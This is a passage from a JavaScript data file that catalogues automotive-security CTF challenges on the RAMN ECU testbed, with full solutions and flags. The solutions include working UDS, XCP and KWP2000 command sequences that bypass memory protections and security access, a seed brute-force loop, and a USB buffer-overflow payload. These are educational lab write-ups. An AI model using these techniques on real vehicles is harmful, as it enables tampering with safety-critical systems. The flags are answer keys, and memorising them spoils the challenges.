        description: "Flag is a 26-byte string at `0x0803e000` but ReadMemoryByAddress won't let me read it :(",
        fullSolution: `## Using DynamicallyDefineDataIdentifier to Read Protected Flash

\`ReadMemoryByAddress\` (service 0x23) is blocked for the flash address range where the flag lives. However, ECU C supports \`DynamicallyDefineDataIdentifier\` (service 0x2C), which lets you define a new virtual DID that maps to any memory range — including the blocked flash region.

**UDS service 0x2C — DynamicallyDefineDataIdentifier**

Subfunction \`0x02\` (defineByMemoryAddress) creates a dynamic DID pointing to a memory region:

\`\`\`
2C 02 <DID high> <DID low> <addrLenFormat> <address bytes> <size byte>
\`\`\`

- Dynamic DIDs must be in range \`0xF300\`–\`0xF3FF\` (per UDS spec)
- \`addrLenFormat = 0x14\` → 4-byte address + 1-byte length

**Step 1 — Define a dynamic DID pointing to the flag**

\`\`\`bash
# Define DID 0xF300 to map to 26 bytes at 0x0803e000
echo "2C 02 F3 00 14 08 03 E0 00 1A" | isotpsend -s 0x7e2 -d 0x7ea can0
# Response: 6C 02 F3 00  (positive response)
\`\`\`

**Step 2 — Read the flag via ReadDataByIdentifier**

\`\`\`bash
echo "22 F3 00" | isotpsend -s 0x7e2 -d 0x7ea can0
isotprecv -s 0x7ea -d 0x7e2 can0
\`\`\`

The response (\`62 F3 00\` + 26 flag bytes) contains \`bh{TAKE_THE_LONG_WAY_HOME}\`.

**Why this works:** \`DynamicallyDefineDataIdentifier\` and \`ReadDataByIdentifier\` bypass the address restriction that \`ReadMemoryByAddress\` enforces, because they go through a different code path in the UDS handler.`,
        flag: 'bh{TAKE_THE_LONG_WAY_HOME}',
      },
      {
        id: 'auto2024-8',
        title: 'Forgotten Field',
        ecu: 'D',
        tags: ['CAN', 'Hardware'],
        difficulty: 'Medium/Difficult',
        description: 'Many tools consider a CAN frame consists of arbitration ID, control flags, and data fields. ID `0x607` thinks they should check some more.',
        fullSolution: `## Reading the Flag from CAN Frame CRC Fields

Standard CAN tools like \`candump\` show the arbitration ID, DLC, and data bytes — but a complete CAN frame at the bit level also contains a **15-bit CRC field** (CRC-15/CAN) appended after the data, before the CRC delimiter.

ECU D encodes **one byte of the flag per CAN frame** in the CRC field of frames with ID \`0x607\`.

**Why this is invisible to candump:**

\`candump\` and most CAN stacks validate the CRC internally and only expose the data payload. The CRC field itself is not shown.

**How to extract the CRC field:**

**Option A — Logic analyzer (recommended)**

Connect a logic analyzer to ECU D's CAN TX pin (easier) or to CANH/CANL (harder due to differential signal). Turn off other ECUs to reduce noise. Configure the logic analyzer's CAN decoder to show full frame fields including CRC.

With Saleae Logic or PulseView: in the protocol decoder output, look for the CRC field annotation on each ID \`0x607\` frame. Collect them in order.

**Option B — Software CRC reconstruction**

From candump data, reconstruct the full CAN bit stream (including bit stuffing per ISO 11898-1) and compute CRC-15/CAN:

\`\`\`
CRC-15/CAN polynomial: 0x4599
Initial value: 0x0000
Over: arbitration ID + RTR + IDE + DLC + data bits (excluding stuff bits)
\`\`\`

The CRC value for each ID \`0x607\` frame, taken in sequence, forms the ASCII bytes of the flag \`bh{LAGGING_BEHIND}\`.`,
        flag: 'bh{LAGGING_BEHIND}',
      },
      {
        id: 'auto2024-9',
        title: 'Follow Me',
        ecu: 'D',
        tags: ['Hardware'],
        difficulty: 'Easy',
        description: 'The lights are flickering when the engine key is on the "IGN" (rightmost) position. We hope that you brought a logic analyzer to debug that…',
        fullSolution: `## Capturing the Flag from SPI LED Data

ECU D controls the body expansion board's LEDs via the SPI peripheral. The SPI signals (MOSI, SCK, CS) have clearly labeled probe points on the body PCB. Normally, ECU D sends a 3-byte LED status update every 10 ms.

When the engine key is turned to the **IGN** (rightmost) position, ECU D transmits a burst of extra data on the SPI bus *before* each LED update — and that burst is the flag in plaintext ASCII.

**Setup:**

Connect a logic analyzer to the SPI probe points on the body expansion PCB:
- MOSI (data from ECU D to LED driver)
- SCK (clock)
- CS (chip select, active low)

Configure the SPI decoder:
- Mode: SPI (CPOL=0, CPHA=0 is typical)
- CS: active low
- Bit order: MSB first

**Capture:**

Turn the engine key to IGN and capture a few SPI transactions.

**What you'll see:**

\`\`\`
Key not at IGN (normal operation):
  CS↓ → [3 bytes: LED status] → CS↑     (every 10ms)

Key at IGN:
  CS↓ → [ASCII flag bytes] → CS↑
  CS↓ → [3 bytes: LED status] → CS↑
\`\`\`

The burst of bytes before the LED update is the flag \`bh{TREE_FORMS_WIND}\` in ASCII. Read the MOSI bytes from the first CS-asserted transaction to get the flag.`,
        flag: 'bh{TREE_FORMS_WIND}',
      },
      {
        id: 'auto2024-10',
        title: 'I2C',
        ecu: 'D',
        tags: ['Hardware'],
        difficulty: 'Medium',
        description: 'This flag will be sent on CAN with ID `0x778` if you can send any byte to ECU D on its I2C interface (port I2C2, address `0x63`).\n\nNote: I2C pins have internal pull-up resistors. Flag will be broadcasted every second on CAN after any I2C data is received.',
        fullSolution: `## Sending I2C Data to Trigger the Flag

ECU D acts as an I2C slave on I2C2 port, address \`0x63\`. When it receives any byte on this interface, it begins broadcasting the flag every second on CAN ID \`0x778\`.

**Step 1 — Find the correct pins**

The STM32L552 reference manual lists I2C2 pin options. On the 48-pin package used by RAMN, the possibilities are:

\`\`\`
SDA options: PB11, PB14  (PF0 not available on 48-pin package)
SCL options: PB10, PB13  (PF1 not available; PB13 is used by SPI)
\`\`\`

Process of elimination leaves: **SDA = PB11, SCL = PB10**. Confirm by checking the RAMN expansion port pinout documentation.

No external pull-up resistors are needed — the challenge note confirms internal pull-ups are enabled.

**Step 2 — Send a byte via I2C**

Use any I2C master (FT2232H, Bus Pirate, Arduino, Raspberry Pi, etc.) at a low frequency (≤ 10 kHz):

\`\`\`python
from pyftdi.i2c import I2cController

ctrl = I2cController()
ctrl.configure('ftdi://ftdi:2232h/1', frequency=10000)
slave = ctrl.get_port(0x63)
slave.write([0xFF])   # any single byte
print("Byte sent — listening for flag on CAN 0x778")
\`\`\`

**Step 3 — Capture the flag on CAN**

\`\`\`bash
candump can0 778:7FF
\`\`\`

The flag \`bh{INFAMOUS_REMAKE}\` repeats every second as ASCII bytes in the CAN payload. Convert hex to ASCII to read it.`,
        flag: 'bh{INFAMOUS_REMAKE}',
      },
      {
        id: 'auto2024-11',
        title: 'Security Access 1',
        ecu: 'D',
        tags: ['Reverse', 'UDS', 'Hardware'],
        difficulty: 'Very Difficult',
        attachments: [
          { name: 'ECUD.hex', url: `${GH}/Automotive_CTF_2024/challenge_attachments/ECUD.hex` },
        ],
        description: 'The attached file (`ECUD.hex`) corresponds to the firmware of ECU D, with all its flags redacted. Try to extract the real value of `bh{XXXXXXXXXXXXXXXXXXX}` from your RAMN hardware.',
        fullSolution: `## Reading a Password Stored in STM32 ROM

ECU D protects two flags with UDS SecurityAccess. The hex file has no debug symbols, but Ghidra can still analyze it (ARM Cortex-M, 32-bit LE, base address \`0x08000000\`).

**Step 1 — Understand the UDS structure**

A quick scan of the firmware reveals two ReadDataByIdentifier-accessible DIDs:
- DID \`0x0001\` → flag 1 (protected by SecurityAccess level \`0x01\`)
- DID \`0x0002\` → flag 2 (protected by SecurityAccess level \`0x03\`)

**Step 2 — Trace the password for level 0x01**

The SecurityAccess check uses \`memcmp\` to compare the client's 16-byte response against an expected password. Following Ghidra references:

1. The \`memcmp\` call (the official write-up locates it around \`0x0900be24\`) compares the client response against an expected 16-byte password
2. That password lives at address \`0x0BF974C0\` *(the intermediate flash pointer \`0x08002310\` cited here is unverified — trace it yourself in Ghidra; the destination \`0x0BF974C0\` is confirmed by the official write-up)*
3. \`0x0BF974C0\` is **not in the firmware file** — it falls in STM32 system memory (ROM bootloader at \`0x0BF90000\`–\`0x0BFF0000\`)

**Key insight:** The STM32 ROM is factory-burned and identical across all STM32L552 chips of the same revision. The password can therefore be read from *any* STM32L552 — including ECU C on the same RAMN board!

**Step 3 — Read the password via ECU C's UDS**

ECU C's ReadMemoryByAddress service isn't restricted:

\`\`\`bash
# Read 16 bytes (0x10) at 0x0BF974C0 via ECU C (0x7e2/0x7ea)
echo "23 14 0B F9 74 C0 10" | isotpsend -s 0x7e2 -d 0x7ea can0
isotprecv -s 0x7ea -d 0x7e2 can0
\`\`\`

The response contains the 16-byte password.

**Step 4 — Authenticate ECU D and read DID 0x0001**

\`\`\`bash
# Request seed (level 0x01)
echo "27 01" | isotpsend -s 0x7e3 -d 0x7eb can0

# Send the password as the key (subfunction 0x02)
# Replace PP with actual password bytes
echo "27 02 PP PP PP PP PP PP PP PP PP PP PP PP PP PP PP PP" | isotpsend -s 0x7e3 -d 0x7eb can0

# Read flag
echo "22 00 01" | isotpsend -s 0x7e3 -d 0x7eb can0
\`\`\``,
        flag: 'bh{We_hAve_HSM_4t_Home}',
      },
      {
        id: 'auto2024-12',
        title: 'Security Access 2',
        ecu: 'D',
        tags: ['Reverse', 'UDS', 'Hardware'],
        difficulty: 'Very Difficult',
        description: 'Same as "Security Access 1", but you are looking for `bh{YYYYYYYYYYYYYYYYYYY}`.',
        fullSolution: `## Deriving a Password from the STM32 CRC Hardware Peripheral

SecurityAccess level \`0x03\` for DID \`0x0002\` uses a more complex password: one derived from the STM32's hardware CRC engine.

**Step 1 — Trace the level 0x03 password in Ghidra**

The \`memcmp\` for level 0x03 compares the client's response against four 32-bit values. Tracing the references:

1. The handler ultimately reads the **STM32 CRC peripheral** at base \`0x40023000\` (confirmed by the official write-up)
2. *(The intermediate pointer chain shown here — \`0x20032A14\` ← \`0x20032820\` ← flash \`0x08000c64\` holding \`0x40023000\` — is unverified; trace it yourself in Ghidra. Only the \`0x40023000\` CRC base and the four CRC values below are confirmed.)*

The firmware feeds strings into the CRC engine and reads back the hardware output register.

**Step 2 — Identify the CRC inputs**

The four strings fed into the CRC engine are (with their lengths):
- \`"HAPPY HAPPY HAPPY HAPPY"\` (22 chars)
- \`"HAPPY HAPPY HAPPY"\` (17 chars)
- \`"HAPPY HAPPY"\` (11 chars)
- \`"HAPPY"\` (5 chars)

The STM32 CRC peripheral defaults to **CRC-32/MPEG-2** (polynomial 0x04C11DB7, initial value 0xFFFFFFFF, no input/output reflection).

**Step 3 — Compute the four CRC values**

Use [crccalc.com](https://crccalc.com/) or Python:

\`\`\`python
import crcmod

crc_fn = crcmod.predefined.mkCrcFun('crc-32-mpeg')
strings = [
    "HAPPY HAPPY HAPPY HAPPY",
    "HAPPY HAPPY HAPPY",
    "HAPPY HAPPY",
    "HAPPY",
]
for s in strings:
    print(f"{s!r}: 0x{crc_fn(s.encode()):08X}")
\`\`\`

Results (little-endian byte order for the UDS request):
- \`"HAPPY HAPPY HAPPY HAPPY"\` → \`0x14b311c9\` → bytes \`C9 11 B3 14\`
- \`"HAPPY HAPPY HAPPY"\`       → \`0x6442CA33\` → bytes \`33 CA 42 64\`
- \`"HAPPY HAPPY"\`             → \`0xC25DE077\` → bytes \`77 E0 5D C2\`
- \`"HAPPY"\`                   → \`0x6DA5F0C1\` → bytes \`C1 F0 A5 6D\`

**Step 4 — Authenticate and read DID 0x0002**

\`\`\`bash
echo "27 03" | isotpsend -s 0x7e3 -d 0x7eb can0
echo "27 04 C9 11 B3 14 33 CA 42 64 77 E0 5D C2 C1 F0 A5 6D" | isotpsend -s 0x7e3 -d 0x7eb can0
echo "22 00 02" | isotpsend -s 0x7e3 -d 0x7eb can0
\`\`\``,
        flag: 'bh{Thanks_P3riPH3Rals!}',
      },
    ],
  },
  {
    id: 'CHV2024',
    name: 'Car Hacking Village 2024',
    year: 2024,
    flagFormat: 'flag{...}',
    difficulty: 'Hard',
    challenges: [
      {
        id: 'chv2024-1',
        title: 'Secret Menu',
        ecu: 'A',
        tags: ['USB', 'Reverse'],
        difficulty: 'Medium',
        attachments: [
          { name: 'ECUA_REDACTED.elf', url: `${GH}/CHV2024/challenge_attachments/ECUA/ECUA_REDACTED.elf` },
        ],
        description: 'Look away while I input my password!\n\nNote: Flag has been redacted in the attached `ECUA_REDACTED.elf`; you must recover the actual flag from a device.\n\nNote: There are USB commands to enter bootloader mode to reprogram ECUs, but these are for organizers only — they will automatically erase the flags.',
        fullSolution: `## Reverse Engineering the Debug Menu Password

ECU A is the only RAMN ECU with USB — it immediately identifies itself as the USB diagnostic interface. A debug menu protected by a physical input code waits behind normal navigation.

**Step 1 — Find the "Awaiting secret code" screen**

Connect to ECU A via USB and browse the on-screen menu. You'll find a screen showing "Awaiting secret code". This screen waits until a global variable \`DEBUG_MODE_UNLOCKED\` is set to 1.

**Step 2 — Reverse engineer the input requirements**

Load \`ECUA_REDACTED.elf\` into Ghidra (Language: ARM Cortex-M 32-bit LE; the ELF includes debug symbols, so function names are preserved).

- Window → Defined Strings → search "Awaiting secret code" → follow cross-references
- Find the code that writes \`DEBUG_MODE_UNLOCKED = 1\`
- It's set only when \`verify_secret_input()\` returns 1
- Analyze that function: it reads values from specific CAN-received sensor inputs and compares them against hardcoded thresholds

**Step 3 — Identify CAN IDs for each input**

Use \`cansniffer -c can0\` or RAMN's built-in CAN monitor screen. Physically move each control one at a time (brake, accelerator, steering wheel, joystick) while watching which CAN ID's payload changes.

Once mapped, set the RAMN inputs to the values required by \`verify_secret_input\`. The debug screen updates to show the menu is unlocked, with instructions to type \`#\` in the USB terminal.

**Step 4 — Find the correct username CRC**

Type \`#\` in the USB terminal, then \`help\`. A \`username\` command accepts one argument. The screen shows that the current username \`default_user\` has an incorrect CRC, and the required target CRC is \`0xDA5D344D\` (algorithm: CRC-32/ISO-HDLC).

This is a reverse-CRC problem: find a username string whose CRC-32/ISO-HDLC equals \`0xDA5D344D\`. Use [CRC RevEng](https://reveng.sourceforge.io/) or [crchack](https://github.com/resilar/crchack):

\`\`\`bash
# crchack appends bytes to a base string to hit the target CRC
crchack -w 32 "admin" 0xDA5D344D
\`\`\`

Enter the resulting username via the USB interface to display the flag.`,
        flag: 'flag{CRC_OF_THE_YEAR_AWARD}',
      },
      {
        id: 'chv2024-2',
        title: 'Sit Next To Me',
        ecu: 'B',
        tags: ['XCP'],
        difficulty: 'Easy/Medium',
        description: "You wouldn't download a byte.\n\nNote: Flag will be transmitted once on CAN ID `0x777` when the challenge is solved.",
        fullSolution: `## Exploiting an XCP Interface to Dump the Expected Unlock Key

ECU B runs an XCP (Universal Measurement and Calibration Protocol) slave. You send commands on CAN ID **0x552** (request) and read replies on **0x553** (response). XCP is used in automotive development for memory access and calibration. It supports authentication, but stores the expected key in accessible RAM.

**Step 1 — Discover the XCP interface**

\`\`\`bash
caringcaribou xcp discovery -autoblacklist 10
caringcaribou xcp info 0x552 0x553
\`\`\`

The info output confirms: CAL/PAG resource present, authentication required. Available commands: GET_STATUS, SYNCH, GET_SEED, UNLOCK, SET_MTA, UPLOAD, DOWNLOAD.

**Step 2 — Establish what's readable**

Flash (0x08000000+) is protected. RAM (0x20000000–0x20040000) is readable via SET_MTA + UPLOAD:

\`\`\`bash
# SET_MTA (0xF6): set memory transfer address to 0x20000000
cansend can0 552#F6000020000000
# UPLOAD (0xF5): read 6 bytes starting at MTA
cansend can0 552#F506
\`\`\`

**Important:** Do NOT use caringcaribou for the dump — it resets the XCP connection between commands, which generates a new random seed each time. Send raw CAN messages to keep the session alive throughout.

**Step 3 — Request a seed and dump RAM to find the expected key**

\`\`\`bash
# Request a 6-byte seed
cansend can0 552#F80001
# Note the seed from the response
\`\`\`

Dump the RAM range systematically (SET_MTA + repeated UPLOAD). The seed is consistently located near address **0x20033f50**. The 6 bytes immediately following the seed at that location are the **expected unlock key** for that seed.

\`\`\`
RAM at 0x20033f50:
  [6 bytes: current seed] [6 bytes: expected key]
\`\`\`

**Step 4 — Authenticate and trigger the flag**

\`\`\`mermaid
sequenceDiagram
  participant Atk as Attacker
  participant B as ECU B XCP
  Atk->>B: GET_SEED F8 on 0x552
  B-->>Atk: seed on 0x553
  Atk->>B: SET_MTA 0x20033f50 then UPLOAD 12 bytes
  B-->>Atk: 6-byte seed + 6-byte expected key
  Atk->>B: UNLOCK F7 + expected key
  B-->>Atk: unlocked
  Atk->>B: DOWNLOAD F0
  B-->>Atk: flag once on 0x777
\`\`\`

1. Request a fresh seed
2. Read 12 bytes from 0x20033f50: first 6 = seed, next 6 = expected key
3. Verify the seed matches (if not, repeat from step 4)
4. Send UNLOCK (\`0xF7\`) with the 6-byte expected key
5. Send DOWNLOAD (\`0xF0\`) to trigger flag transmission

The flag appears **once** on CAN ID **0x777**.`,
        flag: 'flag{ULTRA_RARE_SEED_GET}',
      },
      {
        id: 'chv2024-3',
        title: 'Come again?',
        ecu: 'C',
        tags: ['KWP2000'],
        difficulty: 'Medium',
        description: 'The 2000s called; they want their ECU back.',
        fullSolution: `## Brute-Forcing a 16-bit KWP2000 Security Access Seed

ECU C uses **KWP2000** (ISO 14230, Keyword Protocol 2000) — a pre-UDS diagnostic protocol. It runs on CAN IDs **0x7E6** (request) / **0x7EE** (response).

**Step 1 — Identify the interface**

\`\`\`bash
caringcaribou uds discovery --autoblacklist 10
\`\`\`

ECU C appears at 0x7E6/0x7EE. Service \`0x1A\` (ReadDataByLocalIdentifier, a KWP2000-specific service) confirms this is KWP2000, not UDS.

**Step 2 — Find the accessible session and security level**

The default session doesn't support Security Access. Brute-force all session values to find which accepts the Security Access service:

\`\`\`bash
for i in $(seq 1 255); do
  printf "10 %02x" $i | isotpsend can0 -s 0x7e6 -d 0x7ee
done
\`\`\`

**Session \`0x92\`** (KWP2000 extended diagnostic session) is available. Within it, security level **\`0x05\`** returns a **16-bit (2-byte) seed**.

**Step 3 — Brute force the seed**

A 16-bit seed has only 65,536 possible values. The ECU limits wrong attempts — but calling "Diagnostic Session Control" to request a new session resets the attempt counter without requiring an ECU reset.

**Brute-force loop:**

\`\`\`bash
timeout 1000s bash -c 'while true; do
  echo "10 92" | isotpsend can0 -s 0x7e6 -d 0x7ee    # re-enter session
  echo "27 05" | isotpsend can0 -s 0x7e6 -d 0x7ee    # request seed
  echo "27 06 12 34" | isotpsend can0 -s 0x7e6 -d 0x7ee  # try key 0x1234
  sleep 0.001
done'
\`\`\`

On average, the correct seed (0x1234 in this case) appears after ~32,768 iterations. A faster script would try different key values each loop, but the above is functional given enough time.

**Step 4 — Read the flag**

Once authenticated (positive response \`67 06\` received), read the protected data:

\`\`\`bash
echo "22 00 00" | isotpsend can0 -s 0x7e6 -d 0x7ee
\`\`\`

The response contains the flag \`flag{AGAIN_AND_AGAIN_AND_AGAIN_AND_AGAIN}\`.`,
        flag: 'flag{AGAIN_AND_AGAIN_AND_AGAIN_AND_AGAIN}',
      },
      {
        id: 'chv2024-4',
        title: 'Light the way',
        ecu: 'D',
        tags: ['UDS'],
        difficulty: 'Medium',
        description: "These LEDs were made for lighting.\n\nHint: Dumpable firmware size is `0x0c548` bytes, don't spend your time looking for more.",
        fullSolution: `## Dumping Firmware and Reading the Flag via the LED Control Pointer

ECU D has a UDS interface on CAN IDs **0x7E3** / **0x7EB**. Two features make this challenge possible: firmware dumping via \`REQUEST_UPLOAD\` and a writable "LED control pointer" DID.

**Step 1 — Survey available UDS services**

\`\`\`bash
caringcaribou uds services 0x7e3 0x7eb
caringcaribou uds dump_dids 0x7e3 0x7eb
\`\`\`

DID \`0x0206\` reads back "LED CONTROL POINTER" (an address in memory). DID \`0x0207\` is writable and lets you update that pointer. Changing it points the LEDs at any memory address, displaying that byte's value across the 8 LEDs.

**Step 2 — Dump the firmware**

\`REQUEST_UPLOAD\` (service \`0x35\`) and \`TRANSFER_DATA\` (service \`0x36\`) are active. The firmware size is \`0x0c548\` bytes (given in the prompt):

\`\`\`bash
# REQUEST_UPLOAD: compression=none, address=0x08000000, size=0x0c548
echo "35 44 08 00 00 00 00 0C 54 8" | isotpsend -s 0x7e3 -d 0x7eb can0
# Then loop TRANSFER_DATA (0x36) with block sequence counter until complete
\`\`\`

**Step 3 — Find the flag address in Ghidra**

Load the dump as a raw ARM Cortex-M binary at base \`0x08000000\`. In Defined Strings, search for "flag". You'll find the string \`"Loaded FLAG from private flash at address %p"\` — following the \`%p\` argument reveals that the flag is loaded from address **\`0x0803e000\`**.

**Step 4 — Read the flag byte by byte via LEDs**

Write the flag address into DID \`0x0207\` to point the LEDs at each flag byte in sequence. The 8 LEDs on RAMN's body expansion board display 8 bits — one byte per LED update. Read the LED pattern for each byte position:

\`\`\`bash
# Point LEDs at flag byte 0 (0x0803e000)
echo "2E 02 07 08 03 E0 00" | isotpsend -s 0x7e3 -d 0x7eb can0
# Read 8 LEDs → record the byte → advance to next address

# Point LEDs at flag byte 1 (0x0803e001)
echo "2E 02 07 08 03 E0 01" | isotpsend -s 0x7e3 -d 0x7eb can0
# Continue for all 32 flag bytes
\`\`\`

Refer to [RAMN's body expansion documentation](https://ramn.readthedocs.io/en/latest/hardware/body_expansion.html) for the LED-to-bit mapping. Reading all bytes gives \`flag{BEST_LIGHT_SHOW_IN_VEGAS}\`.`,
        flag: 'flag{BEST_LIGHT_SHOW_IN_VEGAS}',
      },
    ],
  },
  {
    id: 'ESV2025',
    name: 'Embedded Systems Village 2025',
    year: 2025,
    flagFormat: 'flag{...}',
    difficulty: 'Medium',
    challenges: [
      {
        id: 'esv2025-1',
        title: 'RAMN A-1',
        ecu: 'A',
        tags: ['RE', 'USB'],
        difficulty: 'Easy',
        attachments: [
          { name: 'ECUA_REDACTED_FLAGS.hex', url: `${GH}/ESV2025/challenge_attachments/ECUA_REDACTED_FLAGS.hex` },
        ],
        description: 'Here is the firmware for ECU A (with redacted flags). Can you recover the password for the USB interface?',
        fullSolution: 'Unavailable',
        flag: 'flag{ch3stNu7s}',
      },
      {
        id: 'esv2025-2',
        title: 'RAMN A-2',
        ecu: 'A',
        tags: ['PWN', 'USB', 'OSINT'],
        difficulty: 'Medium',
        description: "What is this, a memory dump for ants?\n\nNote: This challenge follows RAMN A-1. It can be solved using only the USB serial interface and ECU A's screen. You can assume most of the source code is unchanged from RAMN's GitHub, and that all memory-dumping features are disabled.",
        fullSolution: 'Unavailable',
        flag: 'flag{H0rSie3eS}',
      },
      {
        id: 'esv2025-3',
        title: 'RAMN D-1',
        ecu: 'D',
        tags: ['PWN', 'UART'],
        difficulty: 'Easy',
        description: "ECU D's UART debug interface has been deactivated and cannot be abused.\n\nNote: You are only allowed to connect to the expansion port of ECU D for this and the D-2 challenge.",
        fullSolution: 'Unavailable',
        flag: 'flag{Bra1nst0rm}',
      },
      {
        id: 'esv2025-4',
        title: 'RAMN D-2',
        ecu: 'D',
        tags: ['PWN', 'UART'],
        difficulty: 'Medium',
        description: "Not quite my tempo.\n\nNote: This challenge follows RAMN D-1.",
        fullSolution: 'Unavailable',
        flag: 'flag{B33GB4UD}',
      },
    ],
  },
  {
    id: 'ESV2024',
    name: 'Embedded Systems Village 2024',
    year: 2024,
    flagFormat: 'flag{...}',
    difficulty: 'Very Hard',
    challenges: [
      {
        id: 'esv2024-1',
        title: "Let's Play a Game",
        ecu: 'A',
        tags: ['USB', 'pwn'],
        difficulty: 'Easy',
        attachments: [
          { name: 'ECUA.elf', url: `${GH}/ESV2024/challenge_attachments/ECUA/ECUA.elf` },
        ],
        description: "The first flag is inside the Chip-8 game engine memory. If only you could play a custom game and look for it...\n\nNew to Chip-8? Try [Octo](https://johnearnest.github.io/Octo/)",
        fullSolution: `## Exploiting a Buffer Overflow to Read Chip-8 Memory

*(Based on the [participant write-up](https://justinapplegate.me/2024/esvctf-playagame/) by Justin Applegate.)*

ECU A runs a Chip-8 emulator. The flag is stored in Chip-8 memory at offsets **\`0x1e9\`–\`0x1ff\`** (23 bytes), placed there by \`RAMN_CHIP8_Init()\` after the game loads.

### Vulnerability

In \`RAMN_ScreenChip8_StartGameFromIndexString()\`, a \`strcpy()\` copies user-supplied input into a 2-byte \`game_index_str\` field. Overflowing this overwrites the ROM pointer and game size fields used by the emulator.

**Constraints:**
- \`game_index\` must not be 1, 2, or 3
- \`game_size\` must be 0–0xFFF

### Exploit

**Connection:** USB serial at 9600 baud.

**Payload (crafted \`play\` command):**

The \`\x01\` bytes set game size fields to pass the validation check:

\`\`\`python
import serial, time

s = serial.Serial('COM5', 9600, timeout=2)

# Overflow game_index_str (2 bytes) → overwrite ROM ptr + size
# \x01\x01\x01 satisfies game_size validation
payload = b'play xxx\x01\x01\x01' + CHIP8_ROM + b'\r'
s.write(payload)
\`\`\`

**Chip-8 payload:**

Use Chip-8 instruction \`A1EC\` (set \`I = 0x1ec\`) to point the index register at the flag region. The emulator crashes and leaks memory contents, revealing 6 flag bytes at a time. Iterate \`I\` values starting from \`0x1ec\` to read all bytes:

\`\`\`
; Chip-8 assembly (Octo syntax)
i := 0x1ec
load v5   ; load V0-V5 from I (6 bytes)
; display each register using built-in hex sprites
\`\`\`

Run the exploit for \`I = 0x1e9, 0x1ef, 0x1f5\` to read all 23 flag bytes.

**Flag:** \`flag{CL053_T0_F0NTS_}\``,
        flag: 'flag{CL053_T0_F0NTS_}',
      },
      {
        id: 'esv2024-2',
        title: 'Jailbreak',
        ecu: 'A',
        tags: ['USB', 'pwn'],
        difficulty: 'Hard',
        attachments: [
          { name: 'ECUA.elf', url: `${GH}/ESV2024/challenge_attachments/ECUA/ECUA.elf` },
        ],
        description: 'There must be some kind of way out of here.\n\nAttachment: same `ECUA.elf` as A1.',
        fullSolution: 'Unavailable',
        flag: 'flag{M0DU10_i5_HARD_}',
      },
      {
        id: 'esv2024-3',
        title: 'Flag Giveaway',
        ecu: 'B',
        tags: ['SPI', 'Hardware'],
        difficulty: 'Easy',
        attachments: [
          { name: 'source.c', url: `${GH}/ESV2024/challenge_attachments/ECUB/source.c` },
          { name: 'flag1_sdcard_log.csv', url: `${GH}/ESV2024/challenge_attachments/ECUB/flag1_sdcard_log.csv` },
        ],
        description: "Sometimes all you need is a suitable vessel. On SPI2.\n\nNote: Provided log is for reference and is not strictly needed for this challenge.",
        fullSolution: 'Unavailable',
        flag: 'flag{PLZ_H0lD_7Hi1s!}',
      },
      {
        id: 'esv2024-4',
        title: "What's My Name Again?",
        ecu: 'B',
        tags: ['SPI', 'Hardware'],
        difficulty: 'Medium/Hard',
        attachments: [
          { name: 'source.c', url: `${GH}/ESV2024/challenge_attachments/ECUB/source.c` },
          { name: 'flag2_sdcard_log.csv', url: `${GH}/ESV2024/challenge_attachments/ECUB/flag2_sdcard_log.csv` },
        ],
        description: 'The old switcheroo.\n\nNote: Provided log is for reference.',
        fullSolution: 'Unavailable',
        flag: 'flag{Gr3EA7_SW4PP1NG}',
      },
      {
        id: 'esv2024-5',
        title: 'Passwords, How Do They Work?',
        ecu: 'C',
        tags: ['I2C', 'Reverse'],
        difficulty: 'Easy',
        attachments: [
          { name: 'ECUC.hex', url: `${GH}/ESV2024/challenge_attachments/ECUC/ECUC.hex` },
        ],
        description: 'ECU C is waiting for a 16-byte password on I2C2. You can write 16 bytes and read up to 25 bytes.\n\nThe first byte you can read is your current security level; the other bytes contain unlocked flags.',
        fullSolution: 'Unavailable',
        flag: 'flag{I2c2_ScL_SD4_&_GND}',
      },
      {
        id: 'esv2024-6',
        title: 'Passwords Again',
        ecu: 'C',
        tags: ['I2C', 'JTAG', 'Reverse'],
        difficulty: 'Very Hard',
        attachments: [
          { name: 'ECUC.hex', url: `${GH}/ESV2024/challenge_attachments/ECUC/ECUC.hex` },
        ],
        description: "Let's do it again. Four times. Sometimes with JTAG. You have unlimited tries.\n\nNote: No fuzzing/timing analysis involved — recover the four passwords with Ghidra and a JTAG adapter.",
        fullSolution: 'Unavailable',
        flag: 'flag{_R0M_A3S_MD5_&_CRC}',
      },
      {
        id: 'esv2024-7',
        title: 'Gonna Leave This Here',
        ecu: 'D',
        tags: ['UART', 'pwn'],
        difficulty: 'Easy',
        attachments: [
          { name: 'ECUD.hex', url: `${GH}/ESV2024/challenge_attachments/ECUD/ECUD.hex` },
        ],
        description: "The LPUART1 interface of ECU D is active (baudrate 28800 bits/s, endline character `CR`).\nGo get your flag.",
        fullSolution: 'Unavailable',
        flag: 'flag{STOPWATCH_TIME}',
      },
      {
        id: 'esv2024-8',
        title: 'Counting Bytes',
        ecu: 'D',
        tags: ['UART', 'pwn'],
        difficulty: 'Hard',
        attachments: [
          { name: 'ECUD.hex', url: `${GH}/ESV2024/challenge_attachments/ECUD/ECUD.hex` },
        ],
        description: 'Now go get the other flag.\n\nSame `ECUD.hex` attachment as D1.',
        fullSolution: 'Unavailable',
        flag: 'flag{N0T_7H1S_AG41N}',
      },
    ],
  },
];

// ── Write-up sources (per-challenge citation links) ───────────────────────────
const WRITEUPS = {
  official:  { name: 'Official RAMN write-ups', url: 'https://ramn.readthedocs.io/en/latest/ctf_writeups.html' },
  justin:    { name: 'Justin Applegate', url: 'https://justinapplegate.me/2024/esvctf-playagame/' },
  laysakura: { name: 'laysakura', url: 'https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/' },
  kusano:    { name: 'kusano_k (Qiita)', url: 'https://qiita.com/kusano_k/items/140d08521b9667cd6ab9' },
  hamayan:   { name: 'hamayanhamayan', url: 'https://blog.hamayanhamayan.com/entry/2024/09/14/112907' },
  emeth:     { name: 'emeth.jp', url: 'https://emeth.jp/diary/2024/09/automotive-ctf-japan-writeup/' },
};

// challenge id → sources used to verify / write the solution
const CHALLENGE_SOURCES = {
  // Automotive CTF Japan 2024 (official page lists these but without technical detail)
  'japan2024-1':  [WRITEUPS.official, WRITEUPS.laysakura],
  'japan2024-2':  [WRITEUPS.official, WRITEUPS.laysakura],
  'japan2024-3':  [WRITEUPS.official, WRITEUPS.laysakura, WRITEUPS.emeth],
  'japan2024-4':  [WRITEUPS.official, WRITEUPS.laysakura],
  'japan2024-5':  [WRITEUPS.official, WRITEUPS.laysakura, WRITEUPS.kusano],
  'japan2024-6':  [WRITEUPS.official, WRITEUPS.laysakura, WRITEUPS.kusano],
